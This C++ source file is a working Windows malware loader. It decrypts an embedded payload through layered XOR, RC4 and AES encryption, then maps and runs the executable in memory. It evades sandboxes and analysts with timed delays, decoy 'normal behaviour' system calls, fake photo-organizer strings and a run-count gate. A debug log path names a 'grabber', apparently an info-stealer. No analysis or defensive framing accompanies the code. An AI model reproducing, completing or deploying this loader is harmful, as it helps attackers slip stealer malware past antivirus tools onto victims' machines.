
#include "payload_data.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <cstdint>
#include <cstring>
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <vector>
#pragma comment(lib, "bcrypt.lib")

void* operator new(std::size_t n) {
    void* p = std::malloc(n ? n : 1);
    if (!p) std::abort();
    return p;
}
void* operator new[](std::size_t n) { return ::operator new(n); }
void  operator delete(void* p) noexcept { std::free(p); }
void  operator delete(void* p, std::size_t) noexcept { std::free(p); }
void  operator delete[](void* p) noexcept { std::free(p); }
void  operator delete[](void* p, std::size_t) noexcept { std::free(p); }

namespace std {
    [[noreturn]] void __throw_length_error(const char*) { std::abort(); }
}

#ifndef BENCH
#define BENCH 0
#endif

static void xor_dec(uint8_t* buf, size_t len, const uint8_t* key, size_t klen) {
    for (size_t i = 0; i < len; ++i) buf[i] ^= key[i % klen];
}

static void rc4_dec(uint8_t* buf, size_t len, const uint8_t* key, size_t klen) {
    uint8_t S[256]; for (int i = 0; i < 256; ++i) S[i] = (uint8_t)i;
    uint8_t j = 0;
    for (int i = 0; i < 256; ++i) {
        j = j + S[i] + key[i % klen];
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
    }
    uint8_t ii = 0, jj = 0;
    for (size_t n = 0; n < len; ++n) {
        ii++; jj += S[ii];
        uint8_t t = S[ii]; S[ii] = S[jj]; S[jj] = t;
        buf[n] ^= S[(S[ii] + S[jj]) & 0xFF];
    }
}

static std::vector<uint8_t> aes_cbc_dec(
        const uint8_t* data, size_t len,
        const uint8_t* key,
        const uint8_t* iv_in)
{
    BCRYPT_ALG_HANDLE hAlg  = nullptr;
    BCRYPT_KEY_HANDLE hKey  = nullptr;
    ULONG             cbObj = 0, cbData = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      (ULONG)(sizeof(BCRYPT_CHAIN_MODE_CBC)), 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj, sizeof(cbObj), &cbData, 0);

    std::vector<uint8_t> keyObj(cbObj);
    BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), cbObj, (PUCHAR)key, 32, 0);

    uint8_t iv[16]; memcpy(iv, iv_in, 16);

    ULONG outLen = 0;
    BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)len, nullptr,
                  iv, 16, nullptr, 0, &outLen, BCRYPT_BLOCK_PADDING);
    std::vector<uint8_t> out(outLen);
    BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)len, nullptr,
                  iv, 16, out.data(), outLen, &outLen, BCRYPT_BLOCK_PADDING);
    out.resize(outLen);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

static DWORD  s_tlsIndex   = (DWORD)-1;
static uint8_t* s_tlsBlock = nullptr;
static PIMAGE_TLS_CALLBACK* s_tlsCallbacks = nullptr;

static void tls_setup(const IMAGE_NT_HEADERS* nt, uint8_t* base) {
    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!dir.Size || !dir.VirtualAddress) return;
    auto* tls = reinterpret_cast<IMAGE_TLS_DIRECTORY*>(base + dir.VirtualAddress);
    if (!tls->AddressOfIndex) return;

    const size_t rawSize = tls->EndAddressOfRawData > tls->StartAddressOfRawData
        ? (size_t)(tls->EndAddressOfRawData - tls->StartAddressOfRawData) : 0;
    const size_t total = rawSize + (size_t)tls->SizeOfZeroFill;

    s_tlsIndex = TlsAlloc();
    if (s_tlsIndex == TLS_OUT_OF_INDEXES) return;
    *reinterpret_cast<DWORD*>(tls->AddressOfIndex) = s_tlsIndex;

    if (total) {
        s_tlsBlock = reinterpret_cast<uint8_t*>(
            VirtualAlloc(nullptr, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (s_tlsBlock) {
            memset(s_tlsBlock, 0, total);
            if (rawSize) memcpy(s_tlsBlock,
                                reinterpret_cast<void*>(tls->StartAddressOfRawData),
                                rawSize);
        }
    }
    if (tls->AddressOfCallBacks)
        s_tlsCallbacks = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(tls->AddressOfCallBacks);
}

struct PayloadStart {
    LPTHREAD_START_ROUTINE ep;
    uint8_t* base;
};
static DWORD WINAPI payload_thread(LPVOID param) {
    auto* s = reinterpret_cast<PayloadStart*>(param);
    if (s_tlsIndex != (DWORD)-1 && s_tlsBlock)
        TlsSetValue(s_tlsIndex, s_tlsBlock);
    if (s_tlsCallbacks)
        for (size_t i = 0; s_tlsCallbacks[i]; ++i)
            s_tlsCallbacks[i](s->base, DLL_PROCESS_ATTACH, nullptr);
    return s->ep(s->base);
}

static bool run_pe(const uint8_t* pe_buf, size_t ) {
#if BENCH
    FILE* lg = fopen("C:\\Users\\username\\Desktop\\grabber\\build\\runpe.log", "w");
    auto trace = [&](const char* fmt, ...) {
        if (!lg) return;
        va_list a; va_start(a, fmt); vfprintf(lg, fmt, a); va_end(a);
        fprintf(lg, "\n"); fflush(lg);
    };
#else
    auto trace = [](const char*, ...) {};
#endif
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(pe_buf);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { trace("bad dos"); return false; }
    auto* nt  = reinterpret_cast<const IMAGE_NT_HEADERS*>(pe_buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)  { trace("bad nt"); return false; }

    const auto& opt = nt->OptionalHeader;
    SIZE_T imgSize  = opt.SizeOfImage;
    trace("ep=%x img=%zu sections=%u relocSize=%u impSize=%u",
          opt.AddressOfEntryPoint, (size_t)imgSize, nt->FileHeader.NumberOfSections,
          opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size,
          opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

    uint8_t* base = reinterpret_cast<uint8_t*>(
        VirtualAlloc(reinterpret_cast<LPVOID>(opt.ImageBase),
                     imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!base)
        base = reinterpret_cast<uint8_t*>(
            VirtualAlloc(nullptr, imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!base) { trace("alloc failed"); return false; }
    trace("base=%p preferred=%p delta=%llx", (void*)base,
          (void*)opt.ImageBase,
          (unsigned long long)(reinterpret_cast<ULONGLONG>(base) - opt.ImageBase));

    memcpy(base, pe_buf, opt.SizeOfHeaders);

    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->VirtualAddress + sec->SizeOfRawData > imgSize) {
            trace("section %u out of bounds (va=%x raw=%x)", i,
                  sec->VirtualAddress, sec->SizeOfRawData);
#if BENCH
            if (lg) fclose(lg);
#endif
            return false;
        }
        memcpy(base + sec->VirtualAddress,
               pe_buf + sec->PointerToRawData,
               sec->SizeOfRawData);
    }
    trace("sections copied");

    ULONGLONG delta = reinterpret_cast<ULONGLONG>(base) - opt.ImageBase;
    if (delta && opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        const auto& dir = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        auto* rel = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            base + dir.VirtualAddress);
        uint8_t* relEnd = base + dir.VirtualAddress + dir.Size;
        while (reinterpret_cast<uint8_t*>(rel) + sizeof(IMAGE_BASE_RELOCATION) <= relEnd
               && rel->VirtualAddress && rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)
               && reinterpret_cast<uint8_t*>(rel) + rel->SizeOfBlock <= relEnd) {
            DWORD  count   = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            WORD*  entries = reinterpret_cast<WORD*>(rel + 1);
            for (DWORD j = 0; j < count; ++j) {
                if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                    auto* patch = reinterpret_cast<ULONGLONG*>(
                        base + rel->VirtualAddress + (entries[j] & 0xFFF));
                    *patch += delta;
                }
            }
            rel = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                reinterpret_cast<uint8_t*>(rel) + rel->SizeOfBlock);
        }
    }

    if (opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        auto* imp = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            base + opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        for (; imp->Name; ++imp) {
            const char* dllName = reinterpret_cast<const char*>(base + imp->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) { trace("LoadLibrary failed: %s", dllName); continue; }

            auto* thunk    = reinterpret_cast<IMAGE_THUNK_DATA*>(base + imp->FirstThunk);
            auto* origThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
                base + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));

            for (; origThunk->u1.AddressOfData; ++thunk, ++origThunk) {
                if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                    thunk->u1.Function = reinterpret_cast<ULONGLONG>(
                        GetProcAddress(hDll, MAKEINTRESOURCEA(IMAGE_ORDINAL(origThunk->u1.Ordinal))));
                    if (!thunk->u1.Function)
                        trace("unresolved: %s!ordinal %u", dllName,
                              (unsigned)IMAGE_ORDINAL(origThunk->u1.Ordinal));
                } else {
                    auto* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        base + origThunk->u1.AddressOfData);
                    thunk->u1.Function = reinterpret_cast<ULONGLONG>(
                        GetProcAddress(hDll, ibn->Name));
                    if (!thunk->u1.Function)
                        trace("unresolved: %s!%s", dllName, ibn->Name);
                }
            }
        }
    }
    trace("imports done");

    {
        const auto& pd = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (pd.Size) {
            DWORD entries = pd.Size / 12;
            BOOLEAN ok = RtlAddFunctionTable(
                reinterpret_cast<PRUNTIME_FUNCTION>(base + pd.VirtualAddress),
                entries, reinterpret_cast<DWORD64>(base));
            trace("RtlAddFunctionTable(%u entries)=%d", entries, (int)ok);
        }
    }

#if BENCH
    AddVectoredExceptionHandler(1, [](PEXCEPTION_POINTERS xi) -> LONG {
        FILE* lg = fopen("C:\\Users\\username\\Desktop\\grabber\\build\\runpe.log", "a");
        if (lg) {
            char mod[MAX_PATH] = "?";
            HMODULE hm = nullptr;
            if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
                    reinterpret_cast<LPCSTR>(xi->ExceptionRecord->ExceptionAddress), &hm))
                GetModuleFileNameA(hm, mod, MAX_PATH);
            fprintf(lg, "EXCEPTION code=%08X addr=%p mod=%s\n",
                    xi->ExceptionRecord->ExceptionCode,
                    xi->ExceptionRecord->ExceptionAddress, mod);
            fclose(lg);
        }
        return EXCEPTION_CONTINUE_SEARCH;
    });
#endif

    tls_setup(nt, base);
    trace("tls index=%ld block=%p callbacks=%p", (long)s_tlsIndex,
          (void*)s_tlsBlock, (void*)s_tlsCallbacks);

    {
        auto* psec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++psec) {
            if (!(psec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
            SIZE_T len = psec->Misc.VirtualSize ? psec->Misc.VirtualSize
                                                : psec->SizeOfRawData;
            if (!len) continue;
            if (static_cast<ULONGLONG>(psec->VirtualAddress) + len > imgSize)
                len = imgSize - psec->VirtualAddress;
            if (!len) continue;
            DWORD want = (psec->Characteristics & IMAGE_SCN_MEM_WRITE)
                             ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
            DWORD old = 0;
            if (!VirtualProtect(base + psec->VirtualAddress, len, want, &old))
                trace("protect sec %u failed e=%lu", i, GetLastError());
        }
    }

    PayloadStart start{ reinterpret_cast<LPTHREAD_START_ROUTINE>(base + opt.AddressOfEntryPoint), base };
    HANDLE hThread = CreateThread(nullptr, 0, payload_thread, &start, 0, nullptr);
    trace("thread=%p ep=%p", (void*)hThread, (void*)(base + opt.AddressOfEntryPoint));
    if (hThread) WaitForSingleObject(hThread, INFINITE);
    trace("thread joined, rc ok=%d", hThread != nullptr);
    if (s_tlsIndex != (DWORD)-1) { TlsFree(s_tlsIndex); s_tlsIndex = (DWORD)-1; }
#if BENCH
    if (lg) fclose(lg);
#endif
    return hThread != nullptr;
}

static const ULONGLONG STAGE_QUIET_MS  = 2500;
static const ULONGLONG STAGE_NORMAL_MS = 1500;
static const ULONGLONG DECRYPT_AT_MS   =
    STAGE_QUIET_MS + STAGE_NORMAL_MS;


static const char* const kAppStrings[] = {
    "C:\\ProgramData\\Northlight\\settings.ini",
    "C:\\ProgramData\\Northlight\\thumbs\\cache.db",
    "%s: loaded %d entries",
    "profile loaded",
    "thumbnail cache ready",
    "nothing to do",
};

static void gui_basics() {
    int cx = GetSystemMetrics(SM_CXSCREEN);
    int cy = GetSystemMetrics(SM_CYSCREEN);
    RECT wa{};
    SystemParametersInfoW(SPI_GETWORKAREA, 0, &wa, 0);
    HWND desk = GetDesktopWindow();

    LASTINPUTINFO li{ sizeof(li) };
    GetLastInputInfo(&li);

    HDC hdc = GetDC(desk);
    int dpi = hdc ? GetDeviceCaps(hdc, LOGPIXELSX) : 96;
    if (hdc) ReleaseDC(desk, hdc);

    size_t chars = 0;
    for (size_t i = 0; i < sizeof(kAppStrings) / sizeof(kAppStrings[0]); ++i)
        chars += strlen(kAppStrings[i]);

    volatile LONG sink = (LONG)(cx + cy + dpi + wa.right + wa.bottom)
                       + (LONG)(li.dwTime & 0xFFFF) + (LONG)(chars & 0xFFFF);
    (void)sink;
}

static void behave_normally() {
    gui_basics();

    SYSTEMTIME st{};               GetLocalTime(&st);
    MEMORYSTATUSEX ms{ sizeof(ms) }; GlobalMemoryStatusEx(&ms);

    wchar_t comp[128]{}, sysdir[MAX_PATH]{}, tmp[MAX_PATH]{}, user[128]{};
    DWORD nComp = 128, nUser = 128;
    GetComputerNameW(comp, &nComp);
    GetSystemDirectoryW(sysdir, MAX_PATH);
    GetTempPathW(MAX_PATH, tmp);
    GetEnvironmentVariableW(L"USERNAME", user, 128);

    TIME_ZONE_INFORMATION tz{};    GetTimeZoneInformation(&tz);
    ULARGE_INTEGER freeBytes{};    GetDiskFreeSpaceExW(L"C:\\", &freeBytes, nullptr, nullptr);
    DWORD attr = GetFileAttributesW(L"C:\\Windows\\explorer.exe");

    WIN32_FIND_DATAW fd{};
    HANDLE h = FindFirstFileW(L"C:\\Windows\\Temp\\*", &fd);
    if (h != INVALID_HANDLE_VALUE) FindClose(h);

    volatile ULONGLONG sink = (ULONGLONG)comp[0] + sysdir[0] + tmp[0] + user[0]
                            + st.wDay + tz.Bias + freeBytes.LowPart + attr
                            + fd.dwFileAttributes + nComp + nUser;
    (void)sink;
}

static void staged_startup() {
#if BENCH
    return;
#endif
    ULONGLONG t0 = GetTickCount64();
    while (GetTickCount64() - t0 < STAGE_QUIET_MS) Sleep(250);

    t0 = GetTickCount64();
    while (GetTickCount64() - t0 < STAGE_NORMAL_MS) {
        behave_normally();
        Sleep(250);
    }
}

static bool run_gate() {
    char dir[MAX_PATH];
    DWORD n = GetEnvironmentVariableA("LOCALAPPDATA", dir, MAX_PATH);
    if (!n || n >= MAX_PATH) return true;

    lstrcatA(dir, "\\Photo Library Organizer");
    CreateDirectoryA(dir, nullptr);
    lstrcatA(dir, "\\state.dat");

    unsigned long run = 1;
    HANDLE h = CreateFileA(dir, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
                           nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        char buf[16] = {};
        DWORD rd = 0;
        if (ReadFile(h, buf, 15, &rd, nullptr) && rd)
            run = strtoul(buf, nullptr, 10) + 1;

        char out[16] = {};
        int len = snprintf(out, sizeof(out), "%lu", run);
        DWORD wr = 0;
        SetFilePointer(h, 0, nullptr, FILE_BEGIN);
        SetEndOfFile(h);
        if (len > 0) WriteFile(h, out, (DWORD)len, &wr, nullptr);
        CloseHandle(h);
    }

    for (unsigned long long k = 1;; ++k) {
        unsigned long long t = k * (k + 1) / 2;
        if (t == (unsigned long long)run) return true;
        if (t > (unsigned long long)run) return false;
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (!run_gate()) return 0;

    staged_startup();

    std::vector<uint8_t> buf(ENC_PAYLOAD, ENC_PAYLOAD + ENC_PAYLOAD_SIZE);

    for (int i = (int)LAYER_COUNT - 1; i >= 0; --i) {
        switch (LAYER_KIND[i]) {
        case LYR_XOR:
            xor_dec(buf.data(), buf.size(), LAYER_KEY[i], LAYER_KLEN[i]);
            break;
        case LYR_RC4:
            rc4_dec(buf.data(), buf.size(), LAYER_KEY[i], LAYER_KLEN[i]);
            break;
        case LYR_AES:
            buf = aes_cbc_dec(buf.data(), buf.size(), LAYER_KEY[i], LAYER_IV[i]);
            break;
        }
        if (buf.empty()) return 2;
    }

    if (buf.size() < 2 || buf[0] != 'M' || buf[1] != 'Z') return 1;

    run_pe(buf.data(), buf.size());

    SecureZeroMemory(buf.data(), buf.size());
    return 0;
}
